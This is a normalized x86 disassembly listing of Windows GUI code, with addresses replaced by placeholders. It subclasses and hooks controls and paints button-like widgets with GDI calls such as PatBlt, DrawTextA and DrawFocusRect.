push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push esi
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0xffff
push esi
call sub_4174a0
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
sub_418130
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_416900
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
xor eax eax
pop esi
retn
sub_418170
sub esp 0x4
push ebx
push esi
push edi
push ebp
call [ GetCurrentThreadId@IAT ]
mov esi eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] esi
je r-xdata
mov edi [ rw-data ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov esi [ esp + 0x18 ]
mov ebx [ esp + 0x20 ]
cmp esi 0x3
jne r-xdata
xor ecx ecx
cmp ecx [ rw-data ]
jge r-xdata
shl edi 0x2
push ebx
mov eax [ esp + 0x20 ]
mov ecx [ edi + edi * 4 + rw-data ]
push eax
push esi
push ecx
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov ebp [ ebx ]
cmp [ ebp + 0x28 ] 0x8002
jne r-xdata
jne r-xdata
mov eax rw-data
lea eax [ edi * 4 ]
test [ eax + eax * 4 + rw-data ] 0x1
je r-xdata
cmp [ rw-data ] 0x20
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push ebx
push eax
push esi
push 0x0
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov [ rw-data ] ecx
mov [ rw-data ] esi
add eax 0x14
inc ecx
cmp ecx [ rw-data ]
jl r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_418130
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push sub_417e00
push eax
call sub_416b10
add esp 0x8
jmp r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ eax ] esi
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esp + 0x1c ]
push eax
push 0x1
push 0xffff
push ecx
call sub_418500
add esp 0x10
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x1c ]
push 0xfffffff0
push eax
mov ebp [ GetWindowLongA@IAT ]
call ebp
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
cmp ecx [ rw-data ]
cmp [ rw-data ] 0x18
je r-xdata
push sub_417e00
push ebp
call sub_416970
add esp 0x8
jmp r-xdata
mov ebp [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push ebp
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
push eax
call [ GetParent@IAT ]
push eax
call sub_418130
add esp 0x4
test eax eax
je r-xdata
sub_418350
sub esp 0x10
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax 0x1
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea ecx [ esp ]
push 0x10
push ecx
push eax
call [ GetClassNameA@IAT ]
lea ecx [ esp ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
cmp eax 0x1
sbb eax eax
add esp 0x10
inc eax
retn
sub_4183a0
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov eax [ esp + 0x14 ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
xor eax eax
retn
cmp eax 0x3
je r-xdata
mov eax 0x1
retn
sub_4183e0
cmp [ rw-data ] 0x35f
push ebx
push esi
push edi
push ebp
jb r-xdata
mov eax [ esp + 0x18 ]
and eax 0x3
cmp eax 0x2
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebp eax
test ebp ebp
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_418500
add esp 0x10
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x2
push ebp
call sub_418500
add esp 0x10
push 0x2
push ebp
call esi
test eax eax
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_418500
add esp 0x10
sub_4184b0
mov eax [ esp + 0x8 ]
and ax 0x1f
movzx ecx ax
cmp ecx 0x3
je r-xdata
xor eax eax
retn
mov ax [ esp + 0xc ]
test al 0x10
je r-xdata
test al 0x20
je r-xdata
cmp ecx 0x2
jle r-xdata
cmp ecx 0x4
jl r-xdata
mov eax 0x1
retn
cmp ecx 0xc
je r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp ecx 0x9
jle r-xdata
cmp ecx 0x10
jl r-xdata
cmp ecx 0x12
jg r-xdata
sub_418500
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push ebp
push esi
call sub_416900
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x10
push eax
xor ebp ebp
push esi
mov ebx r--data
call [ GetClassNameA@IAT ]
mov di [ esp + 0x28 ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
add ebx 0x20
inc ebp
cmp ebx r--data
jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ ebx - 0x1c ]
push eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
test [ ebx ] di
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov bx [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
push ecx
push ebx
push edi
push eax
push esi
mov eax ebp
shl eax 0x5
call [ eax + r--data ]
add esp 0x14
mov edi eax
cmp edi 0x1
jne r-xdata
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
cmp bx 0x1
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_416970
add esp 0x8
cmp edi 0x1
cmp [ rw-data ] 0x10
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_416b10
add esp 0x8
cmp edi 0x1
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_4185f0
sub esp 0x10
lea eax [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
push eax
push edi
call [ GetWindowRect@IAT ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
mov esi eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
mov ecx [ eax + 0x18 ]
test cl 0xc0
jne r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push edi
call [ InvalidateRect@IAT ]
inc [ esp + 0x14 ]
and cl 0x3
cmp cl 0x2
jne r-xdata
test cl 0x2
je r-xdata
mov ecx [ esp + 0x14 ]
sub ecx [ eax + 0x10 ]
cmp ecx [ esp + 0xc ]
jne r-xdata
test cl 0x1
jne r-xdata
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x18 ]
sub ecx [ esp + 0x10 ]
cmp ecx eax
jl r-xdata
inc eax
add [ esp + 0x10 ] eax
sub_4186b0
sub esp 0x10
push ebx
push esi
push edi
push 0xfffffff0
mov edi [ esp + 0x24 ]
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
lea eax [ esp + 0xc ]
push eax
push edi
call [ GetWindowRect@IAT ]
lea ecx [ esp + 0xc ]
push 0x1
push 0x1
push ecx
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
lea eax [ esp + 0xc ]
push eax
push edi
call [ ValidateRect@IAT ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
inc [ esp + 0x14 ]
sub_418720
sub esp 0x1c
lea ecx [ esp + 0xc ]
push ebx
push esi
push edi
mov edi [ esp + 0x34 ]
push ebp
mov eax [ edi ]
mov edx [ edi + 0x4 ]
mov ebx [ edi + 0x8 ]
push 0xf
push 0x7
mov [ ecx ] eax
mov eax [ edi + 0xc ]
push 0x7
mov esi [ esp + 0x40 ]
push edi
push esi
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebx
mov [ ecx + 0xc ] eax
call sub_416c30
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
cmp [ esp + 0x44 ] 0x1
jne r-xdata
push 0xf00021
mov eax [ edi + 0x4 ]
push 0x1
mov ecx [ edi ]
push 0x1
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov ecx [ edi + 0x4 ]
push 0x1
mov eax [ edi + 0x8 ]
push 0x1
dec eax
push ecx
push eax
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
mov ecx [ edi ]
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
push eax
mov eax [ edi + 0x8 ]
dec eax
push eax
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x1
sbb ebx ebx
neg ebx
inc ebx
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov eax [ esp + 0x30 ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
lea eax [ esp + 0x1c ]
push 0xf
push 0x7
push 0x7
push eax
push esi
call sub_416c30
lea eax [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
mov eax [ rw-data ]
inc [ esp + 0x1c ]
inc [ esp + 0x20 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov ecx [ esp + 0x30 ]
push ecx
call [ IsWindowEnabled@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor ebp ebp
push eax
push esi
call [ SelectObject@IAT ]
dec [ esp + 0x28 ]
dec [ esp + 0x24 ]
test ebx ebx
jle r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x20 ]
push 0xf00021
mov edx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ebx
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push ebx
mov ecx [ esp + 0x28 ]
push eax
mov edx [ esp + 0x28 ]
push ecx
push edx
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x0
jne r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
mov ebx [ esp + 0x3c ]
push eax
push ecx
push ebx
push esi
call sub_416e20
mov eax [ esp + 0x38 ]
sub eax [ esp + 0x30 ]
sub eax [ esp + 0x28 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x20 ] eax
mov eax [ esp + 0x24 ]
sub eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x1c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x18 ]
cmp eax ecx
jl r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push 0x1
inc eax
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
push eax
push 0x1
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea ecx [ ebx - 0x1 ]
cmp ecx ebp
jle r-xdata
mov ecx [ esp + 0x24 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x1c ]
add eax [ esp + 0x14 ]
cmp eax ecx
jl r-xdata
mov eax ecx
inc ebp
cmp ebx ebp
jg r-xdata
lea eax [ esp + 0x1c ]
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
cmp [ esp + 0x48 ] 0x0
mov [ esp + 0x24 ] eax
je r-xdata
mov eax ecx
lea eax [ esp + 0x1c ]
push 0x20
mov ecx [ esp + 0x44 ]
push eax
push ecx
push ebx
push esi
call [ DrawTextA@IAT ]
mov ebp [ GetFocus@IAT ]
call ebp
cmp eax [ esp + 0x30 ]
jne r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
mov ebp [ OffsetRect@IAT ]
push eax
call ebp
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x24 ]
sub eax 0x3
cmp eax ecx
jl r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
lea eax [ esp + 0x1c ]
push edi
push eax
lea eax [ esp + 0x24 ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
mov eax [ edi + 0xc ]
sub eax 0x3
cmp eax ecx
jl r-xdata
mov eax ecx
pop ebp
pop edi
pop esi
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x28 ] eax
mov eax ecx
sub_418a60
sub esp 0x154
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x168 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
mov ebx eax
push edi
and eax 0x20
and ebx 0x1f
mov ebp [ GetParent@IAT ]
mov [ esp + 0x24 ] eax
call ebp
mov esi [ esp + 0x16c ]
push 0x2
mov [ esp + 0x20 ] eax
push esi
call [ SetBkMode@IAT ]
lea eax [ esp + 0x44 ]
mov ebp [ GetClientRect@IAT ]
push eax
push edi
call ebp
mov ebp [ esp + 0x48 ]
lea edx [ esp + 0x44 ]
lea ecx [ esp + 0x34 ]
mov eax [ edx ]
push 0x0
push 0x0
push 0x31
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
push edi
mov edx [ edx + 0xc ]
mov [ ecx + 0x4 ] ebp
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push 0xf
mov ebp [ GetSysColor@IAT ]
call ebp
push eax
push esi
call [ SetBkColor@IAT ]
push 0x12
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x1c ]
push edi
push esi
push 0x135
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x40 ]
push eax
mov ebp [ IntersectClipRect@IAT ]
mov eax [ esp + 0x38 ]
push ecx
push edx
push eax
push esi
call ebp
mov ebp [ esp + 0x170 ]
test ebp 0x10
je r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x10 ] eax
push edi
call [ IsWindowEnabled@IAT ]
mov [ esp + 0x28 ] eax
push 0x0
push 0x0
push 0xf2
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x18 ] 0x0
mov ecx eax
and ecx 0x3
mov [ esp + 0x30 ] ecx
cmp ecx 0x1
sbb ecx ecx
and eax 0x4
inc ecx
mov [ esp + 0x54 ] eax
sar eax 0x1
or eax ecx
mov edx eax
shl eax 0x3
sub eax edx
add eax eax
cmp [ esp + 0x28 ] 0x0
mov [ esp + 0x14 ] eax
jne r-xdata
cmp ebx 0x7
je r-xdata
test ebp 0xa
jne r-xdata
add ecx 0x2
mov eax ecx
shl ecx 0x3
sub ecx eax
mov eax [ esp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x40 ]
push 0xf00021
sub eax [ esp + 0x3c ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x44 ]
sub eax [ esp + 0x3c ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea eax [ esp + 0x64 ]
push 0x100
push eax
push edi
call [ GetWindowTextA@IAT ]
mov [ esp + 0x24 ] eax
test ebx ebx
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push esi
call [ SelectObject@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
jmp [ ebx * 4 + jump_table_418f84 ]
cmp ebx 0x1
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x64 ]
push eax
lea eax [ esp + 0x48 ]
push ebx
push ecx
push edx
push eax
push esi
push edi
call sub_418720
add esp 0x1c
jmp r-xdata
mov [ esp + 0x18 ] 0xd
test ebp 0x4
je r-xdata
cmp [ esp + 0x30 ] 0x2
jne r-xdata
test ebp 0x6
je r-xdata
cmp ebx 0x9
ja r-xdata
test ebp 0x2
je r-xdata
push esi
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
mov [ esp + 0x18 ] 0x1a
jmp r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_416e20
add esp 0x10
cmp [ esp + 0x20 ] 0x0
jne r-xdata
test ebp 0x8
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push edi
call [ SelectObject@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
add [ esp + 0x34 ] 0x4
mov eax [ esp + 0x30 ]
add eax [ esp + 0x34 ]
add eax 0x4
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x38 ]
test ebp 0x20
mov [ esp + 0x40 ] eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x54 ]
push eax
push ecx
push rw-data
push esi
call sub_416e20
add esp 0x10
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x54 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_416e20
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x30 ]
add eax [ esp + 0x38 ]
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x44 ]
je r-xdata
mov eax [ esp + 0x44 ]
add eax 0x12
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x4c ]
sub eax 0x12
mov [ esp + 0x3c ] eax
jmp r-xdata
push edi
call [ DeleteDC@IAT ]
mov eax [ esp + 0x18 ]
push 0xcc0020
mov ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x48 ]
push ecx
cmp [ esp + 0x2c ] 0x0
push edi
push 0xd
push 0xe
je r-xdata
mov eax [ esp + 0x20 ]
dec [ esp + 0x4c ]
dec [ esp + 0x50 ]
push 0xf
cdq
sub eax edx
push 0x2
sar eax 0x1
push 0x2
add [ esp + 0x54 ] eax
lea eax [ esp + 0x50 ]
push eax
push esi
call sub_416c30
lea eax [ esp + 0x58 ]
add esp 0x14
push 0x1
push 0x1
push eax
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x44 ]
push 0xf
push 0x0
push 0x0
push ecx
push esi
call sub_416c30
add esp 0x14
cmp [ esp + 0x28 ] 0x0
jne r-xdata
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x54 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov ecx [ esp + 0x4c ]
push edx
push edi
mov esi [ ClientToScreen@IAT ]
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ebp
mov [ edx + 0xc ] eax
mov [ esp + 0x64 ] ecx
call esi
lea ecx [ esp + 0x5c ]
push ecx
push edi
call esi
lea eax [ esp + 0x54 ]
mov ecx [ esp + 0x1c ]
push eax
mov esi [ ScreenToClient@IAT ]
push ecx
call esi
lea ecx [ esp + 0x5c ]
mov eax [ esp + 0x1c ]
push ecx
push eax
call esi
lea ecx [ esp + 0x54 ]
push 0x1
mov edx [ esp + 0x20 ]
push ecx
push edx
call [ InvalidateRect@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
add eax 0x12
mov [ esp + 0x34 ] eax
sub [ esp + 0x4c ] 0x12
mov [ esp + 0x34 ] eax
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x24
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
cmp [ esp + 0x28 ] 0x0
jne r-xdata
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x4c ]
push ecx
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x54 ]
push ecx
sub eax 0xe
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x20
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x54 ]
push 0x1
add eax [ esp + 0x38 ]
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x44 ] eax
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x44 ]
lea eax [ esp + 0x34 ]
push ecx
push eax
lea eax [ esp + 0x3c ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
push eax
push esi
call [ BitBlt@IAT ]
push ebx
push edi
call [ SelectObject@IAT ]
sub_418fb0
sub esp 0x48
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x60 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x5c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x68 ]
push 0x0
mov ebx [ esp + 0x68 ]
push eax
mov esi [ esp + 0x64 ]
push ebx
push edi
push esi
call sub_416b50
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0xf1
mov eax edi
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_416920
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp eax 0xf3
je r-xdata
je r-xdata
mov ebp 0x4
cmp eax 0x1943
jb r-xdata
sub eax 0x7
cmp eax 0x8
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_416920
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0x7
je r-xdata
cmp eax 0x1944
jbe r-xdata
jmp [ eax * 4 + jump_table_419260 ]
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x14 ] eax
cmp edi 0x7
je r-xdata
and eax 0xefffffff
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
mov eax [ esp + 0x68 ]
pop ebp
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e8
add esp 0x48
retn 0x10
mov ebp 0x16
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x1f
cmp al 0x9
jne r-xdata
mov ebp 0x6
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov edi eax
mov ebx [ esp + 0x64 ]
mov ebp ebx
test ebp ebp
jne r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov ebx eax
cmp edi 0xf3
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
or eax 0x10000000
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
xor ebp ebp
jmp r-xdata
push 0x0
push 0x0
push 0xf3
push esi
call [ SendMessageA@IAT ]
mov ebp 0x16
jmp r-xdata
and al 0x1f
cmp al 0x7
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
lea eax [ esp + 0x18 ]
mov ebp [ BeginPaint@IAT ]
push eax
push esi
call ebp
mov ebp eax
cmp ebx [ esp + 0x10 ]
je r-xdata
cmp edi 0xf1
jne r-xdata
mov ebp 0x22
jmp r-xdata
test ebx ebx
jne r-xdata
and edi 0x8
or edi 0x6
push edi
push ebp
push esi
call sub_418a60
add esp 0xc
mov eax [ esp + 0x14 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
push esi
call [ GetDC@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
lea eax [ esp + 0x18 ]
push eax
push esi
call [ EndPaint@IAT ]
xor ebx [ esp + 0x10 ]
test bl 0x3
je r-xdata
push esi
and ebx 0x8
push edi
or ebx ebp
call [ ExcludeUpdateRgn@IAT ]
push ebx
push edi
push esi
call sub_418a60
add esp 0xc
push edi
push esi
call [ ReleaseDC@IAT ]
or ebp 0x4
sub_419290
sub esp 0x44
push ebx
push esi
mov esi [ esp + 0x50 ]
push edi
push ebp
push 0xfffffff0
push esi
